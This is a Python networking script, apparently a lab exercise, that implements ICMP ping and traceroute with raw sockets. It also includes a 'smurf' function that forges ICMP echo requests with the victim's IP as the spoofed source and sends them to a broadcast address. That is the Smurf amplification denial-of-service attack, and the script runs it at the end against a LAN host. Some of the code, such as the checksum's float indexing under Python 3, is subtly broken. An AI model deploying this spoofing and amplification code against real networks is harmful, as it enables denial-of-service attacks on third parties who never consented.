import socket;
import struct;
import random;
import time;
import select;
import math;

ICMP_ECHO_REQUEST = 8
ICMP_CODE = socket.getprotobyname('icmp');



def checksum(source_string):
    # I'm not too confident that this is right but testing seems to
    # suggest that it gives the same answers as in_cksum in ping.c.
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = (source_string[count + 1])*256 + (source_string[count])
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2
    if count_to < len(source_string):
        sum = sum + (source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    # Swap bytes. Bugger me if I know why.
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def create_packet(id):
    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)
    data = ''
    # Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data.encode('utf-8'))
    # Now that we have the right checksum, we put that in. It's just easier
    # to make up a new header than to stuff it into the dummy.
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0,
            socket.htons(my_checksum), id, 1)
    return header + data.encode('utf-8')

def create_smurf_packet(id, source_ip, broadcast_ip):
    header = create_packet(id)

    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0  # kernel will fill the correct total length
    ip_id = 54321
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_ICMP
    ip_check = 0  # kernel will fill the correct checksum
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(broadcast_ip)

    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    # the ! in the pack format string means network order
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos,
                            ip_tot_len,ip_id, ip_frag_off, ip_ttl,
                            ip_proto,ip_check, ip_saddr, ip_daddr)
    return ip_header + header


def receive_ping(my_socket, packet_id, time_sent, timeout):
    time_left = timeout
    while True:
        started_select = time.time()
        ready = select.select([my_socket], [], [], time_left)
        how_long_in_select = time.time() - started_select
        if ready[0] == []: # Timeout
            return 0
        time_received = time.time()
        rec_packet, addr = my_socket.recvfrom(1024)
        # The last 8 bytes are the header of the packet we sent to the server
        icmp_header = rec_packet[-8:]
        type, code, checksum, p_id, sequence = struct.unpack(
                'bbHHh', icmp_header)
        if p_id == packet_id:
            total_time_ms = (time_received - time_sent) * 1000
            # Round to 3 decimal places:
            total_time_ms = math.ceil(total_time_ms * 1000) / 1000
            return (addr[0], total_time_ms)
        time_left -= time_received - time_sent
        if time_left <= 0:
            return 0

def ping(host):
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)

    packet_id = int(random.random() * 65535)
    packet = create_packet(packet_id)
    while packet:
        sent = my_socket.sendto(packet, (host, 1))
        packet = packet[sent:]

    ping_res = receive_ping(my_socket, packet_id, time.time(), timeout)
    my_socket.close()
    return ping_res[1]

def smurf(host, broadcast_ip):
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    my_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    my_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    packet_id = int(random.random() * 65535)
    packet = create_smurf_packet(packet_id, host, broadcast_ip)
    my_socket.sendto(packet, (broadcast_ip, 1))

    my_socket.close()

def echo_one(host, ttl):
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
    my_socket.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)

    packet_id = int(random.random() * 65535)
    packet = create_packet(packet_id)
    while packet:
        sent = my_socket.sendto(packet, (host, 1))
        packet = packet[sent:]

    ping_res = receive_ping(my_socket, packet_id, time.time(), timeout)
    my_socket.close()
    return ping_res

def traceroute(host, ttl):
    try1 = echo_one(host, ttl)
    try2 = echo_one(host, ttl)
    try3 = echo_one(host, ttl)

    if try1 == 0:
        try1str = '*'
    else:
        try1str = try1[0]
    if try2 == 0:
        try2str = '*'
    else:
        try2str = try2[0]
    if try3 == 0:
        try3str = '*'
    else:
        try3str = try3[0]

    final_string = try1str + ', ' + try2str + ', ' + try3str
    final_string = str(ttl) + '  ' + final_string

    if try1 == 0:
        destination_reached = False
    else:
        destination_reached = try1[0] == host

    return (final_string, destination_reached)

dest_addr = "192.168.1.11"
broadcast_addr = "192.168.1.255"
host = socket.gethostbyname(dest_addr)
timeout = 3
max_tries = 30


print('ping to' + dest_addr + ' (' + host + ') is ' + str(ping(host)))

print('myTraceRoute to ' + dest_addr + ' (' + host + '), ' + str(max_tries) +
      ' hops max.')
for x in range(1, max_tries+1):
    (line, destination_reached) = traceroute(host, x)
    print(line)
    if destination_reached:
        break

smurf(host, broadcast_addr)

